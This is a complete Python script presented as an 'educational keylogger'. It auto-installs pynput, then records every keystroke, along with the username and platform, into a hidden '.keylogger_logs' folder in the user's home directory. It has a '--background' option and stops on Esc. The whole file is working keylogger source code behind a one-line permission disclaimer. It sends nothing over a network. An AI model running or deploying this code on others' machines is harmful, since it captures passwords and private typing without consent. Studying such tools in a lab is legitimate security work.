#!/usr/bin/env python3
"""
Educational Keylogger for Cybersecurity Studies
ONLY USE IN CONTROLLED ENVIRONMENTS WITH PROPER PERMISSION
"""

import os
import sys
import time
import subprocess
from pathlib import Path
from datetime import datetime

# Auto-install required libraries
def install_packages():
    required_packages = {
        'pynput': 'pynput'
    }
    
    for package, import_name in required_packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"Successfully installed {package}")

# Install dependencies
install_packages()

from pynput import keyboard
from pynput.keyboard import Key, Listener

class EducationalKeylogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.count = 0
        self.keys = []
        self.start_time = datetime.now()
        
        # Create log directory in user home
        self.log_path = Path.home() / ".keylogger_logs"
        self.log_path.mkdir(exist_ok=True)
        
        self.full_log_path = self.log_path / log_file
        
        # Write startup info
        self.write_log(f"\n\n=== Keylogger Started at {self.start_time} ===\n")
        self.write_log(f"User: {os.getenv('USER', 'Unknown')}\n")
        self.write_log(f"Platform: {sys.platform}\n")
        self.write_log("="*50 + "\n")

    def write_log(self, string):
        """Write to log file"""
        with open(self.full_log_path, "a") as f:
            f.write(string)

    def on_press(self, key):
        """Handle key press events"""
        try:
            # Log the key
            self.keys.append(key)
            self.count += 1
            
            # Write every 10 keys to avoid constant disk writes
            if self.count >= 10:
                self.write_to_file()
                self.count = 0
                
        except Exception as e:
            self.write_log(f"[ERROR] {str(e)}\n")

    def on_release(self, key):
        """Handle key release events"""
        # Stop listener when esc is pressed (for testing)
        if key == Key.esc:
            return False

    def write_to_file(self):
        """Write collected keys to file"""
        if not self.keys:
            return
            
        with open(self.full_log_path, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                
                # Handle special keys
                if "Key.space" in k:
                    f.write(" ")
                elif "Key.enter" in k:
                    f.write("\n")
                elif "Key.backspace" in k:
                    f.write(" [BACKSPACE] ")
                elif "Key.tab" in k:
                    f.write(" [TAB] ")
                elif "Key.shift" in k:
                    f.write(" [SHIFT] ")
                elif "Key.ctrl" in k:
                    f.write(" [CTRL] ")
                elif "Key.alt" in k:
                    f.write(" [ALT] ")
                elif "Key.cmd" in k:
                    f.write(" [CMD] ")
                elif "Key." in k:
                    f.write(f" [{k.replace('Key.', '')}] ")
                else:
                    f.write(k)
                    
            self.keys = []

    def run(self):
        """Start the keylogger"""
        try:
            self.write_log(f"[INFO] Keylogger started at {datetime.now()}\n")
            
            with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
                listener.join()
                
        except Exception as e:
            self.write_log(f"[FATAL ERROR] {str(e)}\n")
        finally:
            # Write any remaining keys
            self.write_to_file()
            end_time = datetime.now()
            duration = end_time - self.start_time
            self.write_log(f"\n\n=== Keylogger Stopped at {end_time} ===\n")
            self.write_log(f"Total duration: {duration}\n")

if __name__ == "__main__":
    # Check if running in background mode
    if len(sys.argv) > 1 and sys.argv[1] == "--background":
        log_file = sys.argv[2] if len(sys.argv) > 2 else "keystrokes.log"
    else:
        log_file = "keystrokes.log"
    
    keylogger = EducationalKeylogger(log_file)
    keylogger.run()